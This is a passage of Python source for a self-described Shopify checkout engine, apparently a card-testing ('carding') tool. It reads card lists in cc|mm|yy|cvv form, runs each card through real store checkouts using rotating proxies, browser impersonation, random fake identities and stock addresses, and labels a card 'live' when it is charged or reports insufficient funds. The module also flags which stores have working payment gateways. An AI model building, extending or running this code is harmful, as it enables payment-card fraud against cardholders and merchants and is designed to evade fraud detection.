"""
Shopify checkout engine.

This is a direct port of the logic in the original ``main.py`` (v3.1):

    * ``LoggedSession``      -> :class:`LoggedSession`
    * GraphQL documents      -> module constants below (unchanged)
    * ``_fetch_products``    -> :meth:`ShopifyEngine.fetch_products`
    * ``validate_card``      -> :meth:`ShopifyEngine.validate_card`
    * ``_normalize_response``-> :func:`normalize_response`
    * ``_parse_gql_errors``  -> :func:`parse_gql_errors`

The algorithms (cart -> checkout page -> shipping proposal -> delivery
proposal -> card tokenization -> submit -> poll receipt) are preserved
verbatim. The only additions are:

    * runtime-configurable limits (``RuntimeSettingsStore``),
    * an ``on_step`` progress callback used by the job runner,
    * cooperative cancellation (raises :class:`JobCancelled` between steps).
"""

from __future__ import annotations

import asyncio
import copy
import datetime
import logging
import os
import random
import re
import time
from collections import defaultdict
from pathlib import Path
from typing import Any, Awaitable, Callable, Optional
from urllib.parse import urlparse

import aiofiles
import orjson
from curl_cffi.requests import AsyncSession, RequestsError

from ..core.config import RuntimeSettingsStore, runtime_store, settings as app_settings

log = logging.getLogger("shopify.engine")

# ---------------------------------------------------------------------------
# GraphQL documents (identical to main.py)
# ---------------------------------------------------------------------------
_PROPOSAL_VARS = (
    "$sessionInput:SessionTokenInput!,"
    "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$checkpointData:String,$queueToken:String,"
    "$reduction:ReductionInput,"
    "$availableRedeemables:AvailableRedeemablesInput,"
    "$tip:TipTermInput,$note:NoteInput,"
    "$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,"
    "$scriptFingerprint:ScriptFingerprintInput,"
    "$transformerFingerprintV2:String,"
    "$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,"
    "$captcha:CaptchaInput,$poNumber:String,"
    "$saleAttributions:SaleAttributionsInput,"
    "$alternativePaymentCurrency:AlternativePaymentCurrencyInput,"
    "$deliveryExpectations:DeliveryExpectationTermsInput,"
    "$memberships:MembershipsInput,"
    "$cartMetafields:[CartMetafieldOperationInput!]"
)

_PROPOSAL_ARGS = (
    "delivery:$delivery,discounts:$discounts,payment:$payment,"
    "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,"
    "reduction:$reduction,availableRedeemables:$availableRedeemables,"
    "tip:$tip,note:$note,poNumber:$poNumber,"
    "nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,"
    "transformerFingerprintV2:$transformerFingerprintV2,"
    "optionalDuties:$optionalDuties,attribution:$attribution,"
    "captcha:$captcha,saleAttributions:$saleAttributions,"
    "alternativePaymentCurrency:$alternativePaymentCurrency,"
    "deliveryExpectations:$deliveryExpectations,"
    "memberships:$memberships,"
    "cartMetafields:$cartMetafields"
)

_SELLER_PROPOSAL_FIELDS = (
    "sellerProposal{"
    "runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "total{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "delivery{__typename "
    "...on FilledDeliveryTerms{deliveryLines{"
    "availableDeliveryStrategies{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "estimatedTimeInTransit{...on IntValueConstraint{value}}}}"
    "selectedDeliveryStrategy{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}"
    "tax{__typename "
    "...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}}"
    "payment{__typename "
    "...on FilledPaymentTerms{availablePaymentLines{"
    "paymentMethod{__typename "
    "...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName}"
    "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}}"
    "__typename}"
)

QUERY_PROPOSAL_SHIPPING = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
)

_RECEIPT_FRAGMENT = (
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token __typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{"
    "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
    "...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
    "__typename}timeout{millisecondsRemaining __typename}__typename}"
    "...on FailedReceipt{id processingError{"
    "...on InventoryClaimFailure{__typename}"
    "...on InventoryReservationFailure{__typename}"
    "...on OrderCreationFailure{paymentsHaveBeenReverted __typename}"
    "...on PaymentFailed{code messageUntranslated __typename}"
    "__typename}__typename}__typename}"
)

QUERY_PROPOSAL_DELIVERY = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
    + _RECEIPT_FRAGMENT
)

MUTATION_SUBMIT = (
    "mutation SubmitForCompletion("
    "$input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],"
    "$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput)"
    "{submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields "
    "postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "...on SubmitSuccess{receipt{...ReceiptDetails}__typename}"
    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}__typename}"
    "...on SubmitFailed{reason __typename}"
    "...on SubmitRejected{"
    "errors{code localizedMessage nonLocalizedMessage __typename}__typename}"
    "...on Throttled{pollAfter pollUrl queueToken __typename}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}__typename}"
    "...on TooManyRequests{__typename}"
    "...on TooManyAttempts{__typename}"
    "__typename}}"
    + _RECEIPT_FRAGMENT
)

QUERY_POLL = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!)"
    "{receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken})"
    "{...ReceiptDetails __typename}}"
    + _RECEIPT_FRAGMENT
)

# ---------------------------------------------------------------------------
# Static data (identical to main.py)
# ---------------------------------------------------------------------------
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "AUD": "AU",
    "EUR": "DE", "NZD": "NZ", "SGD": "SG", "MYR": "MY",
    "PHP": "PH", "THB": "TH", "ZAR": "ZA", "BRL": "BR",
    "MXN": "MX", "SEK": "SE", "NOK": "NO", "DKK": "DK",
    "JPY": "JP", "KRW": "KR",
}

ADDRESS_BOOK: dict[str, dict] = {
    "US": {"address1": "123 Main St",       "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
    "CA": {"address1": "88 Queen St W",     "city": "Toronto",     "postalCode": "M5J2J3",  "zoneCode": "ON",  "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London",      "postalCode": "NW1 6XE", "zoneCode": "ENG", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG Road",      "city": "Mumbai",      "postalCode": "400001",  "zoneCode": "MH",  "countryCode": "IN", "phone": "9876543210"},
    "AE": {"address1": "Burj Khalifa Tower","city": "Dubai",       "postalCode": "00000",   "zoneCode": "DU",  "countryCode": "AE", "phone": "501234567"},
    "HK": {"address1": "88 Nathan Road",    "city": "Kowloon",     "postalCode": "000000",  "zoneCode": "KLN", "countryCode": "HK", "phone": "55555555"},
    "CH": {"address1": "Gotthardstrasse 17","city": "Schwyz",      "postalCode": "6430",    "zoneCode": "SZ",  "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place",    "city": "Sydney",      "postalCode": "2000",    "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Unter den Linden 1","city": "Berlin",      "postalCode": "10117",   "zoneCode": "BE",  "countryCode": "DE", "phone": "3012345678"},
    "FR": {"address1": "1 Rue de Rivoli",   "city": "Paris",       "postalCode": "75001",   "zoneCode": "IDF", "countryCode": "FR", "phone": "142123456"},
    "NZ": {"address1": "1 Queen Street",    "city": "Auckland",    "postalCode": "1010",    "zoneCode": "AUK", "countryCode": "NZ", "phone": "98765432"},
    "SG": {"address1": "1 Raffles Place",   "city": "Singapore",   "postalCode": "048616",  "zoneCode": "01",  "countryCode": "SG", "phone": "61234567"},
    "JP": {"address1": "1-1 Marunouchi",    "city": "Tokyo",       "postalCode": "100-0005","zoneCode": "13",  "countryCode": "JP", "phone": "312345678"},
    "BR": {"address1": "Av. Paulista 1000", "city": "Sao Paulo",   "postalCode": "01310-100","zoneCode": "SP", "countryCode": "BR", "phone": "1112345678"},
    "MX": {"address1": "Paseo de la Reforma 1","city": "Mexico City","postalCode": "06600", "zoneCode": "CMX","countryCode": "MX", "phone": "5512345678"},
    "SE": {"address1": "Drottninggatan 1",  "city": "Stockholm",   "postalCode": "11151",   "zoneCode": "AB",  "countryCode": "SE", "phone": "812345678"},
    "DEFAULT": {"address1": "123 Main St",  "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
}

FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas",
               "Mary","Patricia","Jennifer","Linda","Barbara","Susan","Jessica","Sarah","Karen",
               "Emily","Ashley","Daniel","Matthew","Andrew","Joshua","Christopher","Ryan","Tyler"]
LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez",
               "Martinez","Hernandez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Lee",
               "White","Harris","Martin","Thompson","Turner","Mitchell","Campbell","Roberts","Evans"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","protonmail.com","icloud.com","hotmail.com",
                 "live.com","mail.com","aol.com"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
]

# Response codes that prove the gateway is live (identical to main.py).
# This is the *site check* live set — exactly what `/check` reported as `valid`.
LIVE_RESPONSES = frozenset({
    "ORDER_PLACED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
    "CARD_DECLINED", "INVALID_CVC", "EXPIRED_CARD",
    "INVALID_CARD", "THROTTLED",
})

# Codes that mean "the store could not be tested" (mirrors the client-side
# error keyword list of the original UI).
ERROR_RESPONSES = frozenset({
    "CAPTCHA_REQUIRED", "THROTTLED", "TIMEOUT", "GRAPHQL_ERROR", "ERROR",
    "CART_FAILED", "NO_ATTEMPT_TOKEN", "NO_SESSION_TOKEN", "SESSION_EXPIRED",
    "NO_SHOPIFY_PAYMENTS_GATEWAY", "NO_PRODUCT", "SITE_REQUIRES_LOGIN",
    "CHECKPOINTDENIED", "NEGOTIATE_FAILED", "NO_SELLER_PROPOSAL",
    "TOKENIZATION_FAILED", "SUBMIT_FAILED", "PRICE_OVER_MAX", "CHECKOUT_FAILED",
    "NO_PAYMENT_REQUIRED", "NETWORK_ERROR", "CANCELLED",
})

# The *card check* live set. A card is good only when it charged or the issuer
# reported insufficient funds; every other processed answer (declined, expired,
# invalid CVC, 3DS required, …) is a decline from the card's point of view — even
# though those same answers prove the store is live.
CARD_LIVE = frozenset({"ORDER_PLACED", "INSUFFICIENT_FUNDS"})


class JobCancelled(Exception):
    """Raised between engine steps when a job cancellation was requested."""


# ---------------------------------------------------------------------------
# File logging of incoming/outgoing traffic (requests.txt) — same format
# ---------------------------------------------------------------------------
_log_lock: Optional[asyncio.Lock] = None
_SEP = "=" * 70


def _lock() -> asyncio.Lock:
    global _log_lock
    if _log_lock is None:
        _log_lock = asyncio.Lock()
    return _log_lock


async def _write_log(entry: str) -> None:
    async with _lock():
        try:
            await asyncio.to_thread(_rotate_if_needed)
            async with aiofiles.open(app_settings.log_file, mode="a", encoding="utf-8") as f:
                await f.write(entry)
        except Exception as ex:
            log.warning("Failed to write request log: %s", ex)


# requests.txt holds every GraphQL payload, so it grows fast (tens of MB after a
# few hundred checks). Rotate once past the cap, keeping exactly one previous file.
LOG_MAX_BYTES = 25 * 1024 * 1024


def _rotate_if_needed() -> None:
    path = Path(app_settings.log_file)
    try:
        if not path.exists() or path.stat().st_size < LOG_MAX_BYTES:
            return
        previous = path.with_suffix(path.suffix + ".1")
        if previous.exists():
            previous.unlink()
        path.replace(previous)
        log.info("Rotated %s at %d MB", path.name, LOG_MAX_BYTES // (1024 * 1024))
    except OSError as ex:
        log.warning("Could not rotate request log: %s", ex)


def _truncate(text: str, limit: int = 3000) -> str:
    if len(text) > limit:
        return text[:limit] + f"\n... [truncated {len(text) - limit} chars]"
    return text


async def _log_outgoing(method: str, url: str, req_body: Any,
                        status_code: int, resp_text: str,
                        elapsed_ms: float, label: str = "") -> None:
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        if isinstance(req_body, bytes):
            rb = req_body.decode("utf-8", errors="replace")
        elif req_body is None:
            rb = ""
        else:
            rb = str(req_body)
    except Exception:
        rb = "<unreadable>"

    entry = (
        f"\n{_SEP}\n"
        f"[{now}]  OUTGOING  {method} {url}"
        + (f"  [{label}]" if label else "") + "\n"
        f"Status   : {status_code}\n"
        f"Time     : {elapsed_ms:.1f}ms\n"
        f"Req Body :\n{_truncate(rb, 1500)}\n"
        f"Response :\n{_truncate(resp_text, 3000)}\n"
        f"{_SEP}\n"
    )
    asyncio.create_task(_write_log(entry))


class LoggedSession:
    """Thin wrapper around curl_cffi AsyncSession that logs every request."""

    def __init__(self, session: "AsyncSession"):
        self._s = session

    async def _call(self, method: str, url: str, label: str = "",
                    data=None, json=None, **kwargs):
        t0 = time.time()
        req_body = data if data is not None else (
            orjson.dumps(json) if json is not None else None
        )
        try:
            if json is not None:
                resp = await getattr(self._s, method.lower())(url, json=json, **kwargs)
            elif data is not None:
                resp = await getattr(self._s, method.lower())(url, data=data, **kwargs)
            else:
                resp = await getattr(self._s, method.lower())(url, **kwargs)

            elapsed = (time.time() - t0) * 1000
            try:
                resp_text = resp.text
            except Exception:
                resp_text = "<unreadable>"

            asyncio.create_task(
                _log_outgoing(method.upper(), url, req_body,
                              resp.status_code, resp_text, elapsed, label)
            )
            return resp

        except Exception as exc:
            elapsed = (time.time() - t0) * 1000
            asyncio.create_task(
                _log_outgoing(method.upper(), url, req_body,
                              0, f"EXCEPTION: {type(exc).__name__}: {exc}",
                              elapsed, label)
            )
            raise

    async def get(self, url: str, label: str = "", **kwargs):
        return await self._call("GET", url, label=label, **kwargs)

    async def post(self, url: str, label: str = "", data=None, json=None, **kwargs):
        return await self._call("POST", url, label=label, data=data, json=json, **kwargs)

    def __getattr__(self, name):
        return getattr(self._s, name)

    async def aclose(self) -> None:
        res = self._s.close()
        if asyncio.iscoroutine(res):
            await res


# ---------------------------------------------------------------------------
# Parsers / helpers (identical to main.py)
# ---------------------------------------------------------------------------
def parse_card(raw: str) -> Optional[dict]:
    """Accept cc|mm|yy|cvv and cc|mm|yyyy|cvv.  Returns normalized dict or None."""
    raw = (raw or "").strip()
    if not raw or raw.startswith("#"):
        return None
    parts = raw.replace(" ", "").split("|")
    if len(parts) != 4:
        return None
    cc_num, mon, yr, cvv = [p.strip() for p in parts]
    if not (cc_num.isdigit() and mon.isdigit() and yr.isdigit() and cvv.isdigit()):
        return None
    if len(yr) == 4:
        yr = yr[2:]
    if len(yr) != 2:
        return None
    if not 1 <= int(mon) <= 12:
        return None
    if len(cc_num) < 13 or len(cc_num) > 19:
        return None
    return {"cc": cc_num, "month": mon, "year": yr, "cvv": cvv}


def parse_proxy(raw: Optional[str]) -> Optional[str]:
    if not raw:
        return None
    parts = raw.strip().split(":")
    if len(parts) != 4:
        return None
    ip, port, user, password = parts
    return f"http://{user}:{password}@{ip}:{port}"


def pick_address(url: str, currency: Optional[str] = None) -> dict:
    netloc = urlparse(url).netloc.split(":")[0]
    tld = netloc.split(".")[-1].upper()
    if tld in ADDRESS_BOOK:
        return ADDRESS_BOOK[tld]
    if currency:
        cc = C2C.get(currency.upper())
        if cc and cc in ADDRESS_BOOK:
            return ADDRESS_BOOK[cc]
    return ADDRESS_BOOK["DEFAULT"]


def random_identity() -> tuple[str, str, str]:
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    email = f"{first.lower()}.{last.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    return first, last, email


def extract(text: str, start: str, end: str) -> Optional[str]:
    idx = text.find(start)
    if idx == -1:
        return None
    sub = text[idx + len(start):]
    end_idx = sub.find(end)
    if end_idx == -1:
        return None
    val = sub[:end_idx]
    return val if val else None


def extract_sst(text: str, headers: dict) -> Optional[str]:
    for key in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token"):
        if key in headers:
            return headers[key]
    patterns = [
        ('name="serialized-sessionToken" content="&quot;', "&quot;"),
        ('name="serialized-sessionToken" content="', '"'),
        ('"serializedSessionToken":"',   '"'),
        ('"sessionToken":"',             '"'),
        ("sessionToken&quot;:&quot;",   "&quot;"),
        ('data-session-token="',         '"'),
        ('"checkout_session_token":"',   '"'),
    ]
    for s, e in patterns:
        val = extract(text, s, e)
        if val and len(val) > 10:
            return val
    return None


def normalize_response(raw: Optional[str]) -> str:
    """Map raw Shopify / transport error text to a standard code."""
    if not raw:
        return "CARD_DECLINED"
    msg = str(raw).upper()

    if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT", "PAYMENT_COMPLETE", "ORDER_CREATED")):
        return "ORDER_PLACED"
    if any(k in msg for k in ("ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "OTP",
                               "REDIRECT_TO_3DS", "COMPLETE_PAYMENT", "CHALLENGE",
                               "AUTHENTICATION_REQUIRED", "THREEDSSECURE",
                               "THREE_D_SECURE", "3D_SECURE", "SCA_REQUIRED")):
        return "3DS_REQUIRED"
    if any(k in msg for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE",
                               "SECURITY_CODE", "CVV_FAILURE", "INCORRECT_CVC",
                               "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
        return "INVALID_CVC"
    if any(k in msg for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "DO_NOT_HONOR",
                               "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE")):
        return "INSUFFICIENT_FUNDS"
    if any(k in msg for k in ("EXPIRED", "EXPIRY", "INVALID_EXPIRY", "EXPIRATION")):
        return "EXPIRED_CARD"
    if any(k in msg for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD",
                               "INCORRECT_NUMBER", "BAD_NUMBER", "INVALID_ACCOUNT",
                               "CARD_NOT_SUPPORTED")):
        return "INVALID_CARD"
    if any(k in msg for k in ("LOST", "STOLEN", "PICKUP", "RESTRICTED", "REVOCATION")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("CALL_ISSUER", "REFER_TO_ISSUER", "CONTACT_ISSUER")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED",
                               "NOT_PERMITTED", "SERVICE_NOT_ALLOWED",
                               "TRY_AGAIN_LATER", "LIMIT_EXCEEDED")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
        return "CAPTCHA_REQUIRED"
    return "CARD_DECLINED"


def parse_gql_errors(errors: list) -> str:
    """Conservative GraphQL error interpreter (identical to main.py)."""
    for err in errors:
        for field in ("code", "nonLocalizedMessage", "localizedMessage",
                      "message", "localizedMessageHtml", "messageUntranslated"):
            raw = str(err.get(field) or "")
            if not raw:
                continue
            norm = normalize_response(raw)
            if norm != "CARD_DECLINED":
                return norm
            upper = raw.upper()
            if any(k in upper for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
                return "CAPTCHA_REQUIRED"
            if any(k in upper for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "EXCEEDS_BALANCE")):
                return "INSUFFICIENT_FUNDS"
            if any(k in upper for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE", "CVV_FAILURE", "INCORRECT_CVC")):
                return "INVALID_CVC"
            if any(k in upper for k in ("PAYMENT_DECLINED", "CARD_DECLINED",
                                         "CHARGE_DECLINED", "CARD_WAS_DECLINED",
                                         "FRAUD")):
                return "CARD_DECLINED"
            if any(k in upper for k in ("CHECKOUT_ALREADY_COMPLETED", "ALREADY_ACCEPTED")):
                return "CARD_DECLINED"
            if any(k in upper for k in ("SESSION_EXPIRED", "SESSION_INVALID",
                                         "TOKEN_EXPIRED", "INVALID_SESSION")):
                return "SESSION_EXPIRED"
            if any(k in upper for k in ("LOGIN_REQUIRED", "ACCOUNT_REQUIRED",
                                         "CUSTOMER_DISABLED")):
                return "SITE_REQUIRES_LOGIN"
            if any(k in upper for k in ("OUT_OF_STOCK", "SOLD_OUT",
                                         "INVENTORY_CLAIM", "INVENTORY_RESERVATION")):
                return "NO_PRODUCT"
            if any(k in upper for k in ("THROTTLED", "RATE_LIMIT", "TOO_MANY_REQUESTS",
                                         "RATE_LIMITED", "RETRY_LATER")):
                return "THROTTLED"
    return "GRAPHQL_ERROR"


def classify(response: str, approved: str | bool = "False", mode: str = "site") -> dict[str, Any]:
    """
    Reconcile the server-side LIVE_RESPONSES set with the client-side tabs of the
    original UI.

    ``bucket`` is what the UI groups by, and the live set depends on what is being
    checked:

      * ``mode="site"`` — the store is on trial. Live = the gateway answered with
        real evidence, i.e. membership of :data:`LIVE_RESPONSES` (exactly what the
        original ``/check`` returned as ``valid``).
      * ``mode="card"`` — the card is on trial. Live = membership of
        :data:`CARD_LIVE` (charged, or the issuer said funds were short). Every
        other processed answer is a decline.

    Anything in :data:`ERROR_RESPONSES` that is not a live answer means the check
    could not be completed, and everything else is a decline.

    ``gateway_live`` always describes the *store*, so a card scan still records
    that the store processed the card. The raw keys stay ``live``/``die``/``error``
    for API compatibility; only the labels differ in the UI.
    """
    code = (response or "UNKNOWN").upper()
    # The engine appends detail after a colon ("NO_PRODUCT: No products found",
    # "PRICE_OVER_MAX: total $12.00 > $8.00") — bucket by the base code.
    code = code.split(":", 1)[0].strip()
    live_set = CARD_LIVE if mode == "card" else LIVE_RESPONSES

    if code in live_set:
        bucket = "live"
    elif code in ERROR_RESPONSES:
        bucket = "error"
    else:
        bucket = "die"

    return {
        "bucket": bucket,
        "gateway_live": code in LIVE_RESPONSES,
        "approved": str(approved).lower() == "true",
        "charged": code == "ORDER_PLACED",
    }


def mask_card(card: str) -> str:
    if not card:
        return ""
    parts = card.split("|")
    if len(parts) < 4:
        return card
    cc, mm, yy = parts[0], parts[1], parts[2]
    if len(cc) > 6:
        cc = f"{cc[:6]}{'*' * (len(cc) - 10)}{cc[-4:]}"
    return f"{cc}|{mm}|{yy}|***"


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------
StepCallback = Callable[[str], Awaitable[None]]


class ShopifyEngine:
    """Holds the shared product cache, per-site semaphores and sessions."""

    def __init__(self, runtime: RuntimeSettingsStore):
        self.runtime = runtime
        self._site_semaphores: dict[str, asyncio.Semaphore] = defaultdict(
            lambda: asyncio.Semaphore(runtime.site_concurrency)
        )
        # hostname -> {"product": dict|None, "candidates": list, "err": str, "ts": float}
        self._product_cache: dict[str, dict] = {}
        self.stats: dict[str, int] = defaultdict(int)

    # -- cache -------------------------------------------------------------
    def cache_snapshot(self) -> list[dict]:
        now = time.time()
        out = []
        for key, entry in self._product_cache.items():
            host, _, cap = key.partition("|")
            out.append({
                "host": host,
                "max_price": float(cap) if cap else None,
                "product_title": (entry.get("product") or {}).get("title"),
                "price": (entry.get("product") or {}).get("price"),
                "candidates": len(entry.get("candidates") or []),
                "error": entry.get("err"),
                "age_seconds": round(now - entry.get("ts", now), 1),
                "expires_in": round(max(0.0, self.runtime.cache_ttl - (now - entry.get("ts", now))), 1),
            })
        return sorted(out, key=lambda c: c["age_seconds"])

    def clear_cache(self) -> int:
        count = len(self._product_cache)
        self._product_cache.clear()
        return count

    # -- session -----------------------------------------------------------
    def make_session(self, proxy_str: Optional[str] | None, timeout: float | None = None) -> LoggedSession:
        proxy = parse_proxy(proxy_str) if proxy_str else None
        proxies = {"http": proxy, "https": proxy} if proxy else None
        return LoggedSession(
            AsyncSession(
                impersonate="chrome",
                timeout=timeout or self.runtime.request_timeout,
                proxies=proxies,
            )
        )

    def _sem(self, hostname: str) -> asyncio.Semaphore:
        sem = self._site_semaphores.get(hostname)
        if sem is None or getattr(sem, "_value", None) is None:
            sem = asyncio.Semaphore(self.runtime.site_concurrency)
            self._site_semaphores[hostname] = sem
        return sem

    # -- step helper -------------------------------------------------------
    @staticmethod
    async def _step(on_step: StepCallback | None, name: str) -> None:
        if on_step is not None:
            await on_step(name)

    # ------------------------------------------------------------------
    # Product discovery (verbatim port of _fetch_products)
    # ------------------------------------------------------------------
    async def fetch_products(
        self,
        base_url: str,
        proxy_str: Optional[str] = None,
        max_price: Optional[float] = None,
        use_cache: bool = True,
        on_step: StepCallback | None = None,
    ) -> tuple[Optional[dict], list[dict], Optional[str]]:
        """
        Returns (best_product, all_candidates, error_string).
        Results are cached per hostname **and price cap** for ``cache_ttl`` seconds,
        so a low-cap request can never hide a higher-cap one.
        """
        if not base_url.startswith("http"):
            base_url = "https://" + base_url

        hostname = urlparse(base_url).netloc
        now = time.time()
        limit = self.runtime.max_price if max_price is None else max_price
        cache_key = f"{hostname}|{limit:g}"

        cached = self._product_cache.get(cache_key)
        if use_cache and cached and (now - cached["ts"]) < self.runtime.cache_ttl:
            await self._step(on_step, f"cache hit for {hostname}")
            return cached.get("product"), cached.get("candidates", []), cached.get("err")

        await self._step(on_step, f"fetching product feed for {hostname}")
        session = self.make_session(proxy_str)

        try:
            all_variants: list[dict] = []
            urls_to_try = [
                f"{base_url}/products.json?limit=250&sort_by=price-ascending",
                f"{base_url}/products.json?limit=250",
            ]
            for url in urls_to_try:
                try:
                    resp = await session.get(url, label="products", allow_redirects=True)
                    if resp.status_code == 200:
                        data = orjson.loads(resp.content)
                        products = data.get("products", [])
                        if products:
                            all_variants = products
                            break
                    elif resp.status_code in (429, 430):
                        err = "THROTTLED"
                        self._product_cache[cache_key] = {"product": None, "candidates": [], "err": err, "ts": now}
                        return None, [], err
                except Exception:
                    continue

            candidates: list[dict] = []
            best: Optional[dict] = None
            best_price = float("inf")

            if not all_variants:
                # Fallback for headless Shopify where products.json is unavailable
                try:
                    import xml.etree.ElementTree as ET
                    await self._step(on_step, "products.json empty — scanning sitemap")
                    sitemap_url = f"{base_url}/sitemap_products_1.xml"
                    smap_resp = await session.get(sitemap_url, label="sitemap", allow_redirects=True)
                    if smap_resp.status_code == 200:
                        root = ET.fromstring(smap_resp.content)
                        urls = []
                        for child in root:
                            if child.tag.endswith("url"):
                                for loc in child:
                                    if loc.tag.endswith("loc"):
                                        urls.append(loc.text)

                        if urls:
                            sample_urls = random.sample(urls, min(25, len(urls)))
                            for purl in sample_urls:
                                try:
                                    p_resp = await session.get(purl, label="product", allow_redirects=True)
                                    matches = re.finditer(
                                        r'"id":(\d+).*?"inStock":true.*?,"price":([\d.]+)', p_resp.text
                                    )
                                    for m in matches:
                                        variant_id = m.group(1)
                                        price = float(m.group(2))
                                        if 0 < price <= limit:
                                            entry = {
                                                "site": base_url,
                                                "price": f"{price:.2f}",
                                                "price_f": price,
                                                "variant_id": str(variant_id),
                                                "title": "Product",
                                                "handle": "",
